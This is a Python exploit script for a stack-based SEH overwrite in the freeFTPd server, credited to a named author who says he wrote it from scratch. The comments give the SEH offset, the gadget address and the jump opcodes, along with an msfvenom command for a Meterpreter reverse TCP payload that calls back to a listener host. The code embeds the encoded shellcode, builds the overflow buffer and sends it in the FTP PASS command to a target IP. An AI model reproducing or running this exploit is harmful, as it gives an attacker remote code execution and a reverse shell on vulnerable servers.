# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the SEH overwrite vulnerability in freeFTPd. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.

# SEH offset: 801
# 0x00432efa : pop ebp # pop ebx # ret  | startnull {PAGE_EXECUTE_READ} [FreeFTPdService.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.0.8.0 (C:\Program Files\freeFTPd\FreeFTPdService.exe)
# command to generate shellcode: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.156 -b '\x00\x0A\x0D\x40' -f python
# short jump: jmp $-120 EB86
# long jump : jmp $-600 E9A3FDFFFF
import sys
import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buf =  ""
buf += "\xb8\xb5\x2e\x24\xb9\xda\xce\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x56\x83\xc2\x04\x31\x42\x0f\x03\x42\xba\xcc"
buf += "\xd1\x45\x2c\x92\x1a\xb6\xac\xf3\x93\x53\x9d\x33\xc7"
buf += "\x10\x8d\x83\x83\x75\x21\x6f\xc1\x6d\xb2\x1d\xce\x82"
buf += "\x73\xab\x28\xac\x84\x80\x09\xaf\x06\xdb\x5d\x0f\x37"
buf += "\x14\x90\x4e\x70\x49\x59\x02\x29\x05\xcc\xb3\x5e\x53"
buf += "\xcd\x38\x2c\x75\x55\xdc\xe4\x74\x74\x73\x7f\x2f\x56"
buf += "\x75\xac\x5b\xdf\x6d\xb1\x66\xa9\x06\x01\x1c\x28\xcf"
buf += "\x58\xdd\x87\x2e\x55\x2c\xd9\x77\x51\xcf\xac\x81\xa2"
buf += "\x72\xb7\x55\xd9\xa8\x32\x4e\x79\x3a\xe4\xaa\x78\xef"
buf += "\x73\x38\x76\x44\xf7\x66\x9a\x5b\xd4\x1c\xa6\xd0\xdb"
buf += "\xf2\x2f\xa2\xff\xd6\x74\x70\x61\x4e\xd0\xd7\x9e\x90"
buf += "\xbb\x88\x3a\xda\x51\xdc\x36\x81\x3d\x11\x7b\x3a\xbd"
buf += "\x3d\x0c\x49\x8f\xe2\xa6\xc5\xa3\x6b\x61\x11\xb2\x7c"
buf += "\x92\xcd\x7c\xec\x6c\xee\x7c\x24\xab\xba\x2c\x5e\x1a"
buf += "\xc3\xa7\x9e\xa3\x16\x5d\x95\x33\x59\x09\xd7\x5f\x31"
buf += "\x4b\x28\x71\x9e\xc2\xce\x21\x4e\x84\x5e\x82\x3e\x64"
buf += "\x0f\x6a\x55\x6b\x70\x8a\x56\xa6\x19\x21\xb9\x1e\x71"
buf += "\xde\x20\x3b\x09\x7f\xac\x96\x77\xbf\x26\x12\x87\x0e"
buf += "\xcf\x57\x9b\x67\xa8\x97\x63\x78\x5d\x97\x09\x7c\xf7"
buf += "\xc0\xa5\x7e\x2e\x26\x6a\x80\x05\x35\x6d\x7e\xd8\x0f"
buf += "\x05\x49\x4e\x2f\x71\xb6\x9e\xaf\x81\xe0\xf4\xaf\xe9"
buf += "\x54\xad\xfc\x0c\x9b\x78\x91\x9c\x0e\x83\xc3\x71\x98"
buf += "\xeb\xe9\xac\xee\xb3\x12\x9b\x6c\xb3\xec\x59\x5b\x1c"
buf += "\x84\xa1\xdb\x9c\x54\xc8\xdb\xcc\x3c\x07\xf3\xe3\x8c"
buf += "\xe8\xde\xab\x84\x63\x8f\x1e\x35\x73\x9a\xff\xeb\x74"
buf += "\x29\x24\x1c\x0e\x42\xdb\xdd\xef\x4a\xb8\xde\xef\x72"
buf += "\xbe\xe3\x39\x4b\xb4\x22\xfa\xe8\xc7\x11\x5f\x58\x42"
buf += "\x59\xf3\x9a\x47"


evilString = "A"*300 + buf + "A"*106 + "\xE9\xA3\xFD\xFF\xFF" + "A"*20 + "\xEB\x86" + "\xfa\x2e\x43\x00" + "CCCC" + "D" * 4191

s.connect(('192.168.126.144',21))
print s.recv(1024)
s.send("USER anon\r\n")
print s.recv(1024)
s.send("PASS "+evilString+"\r\n")
print s.recv(1024)
s.close()
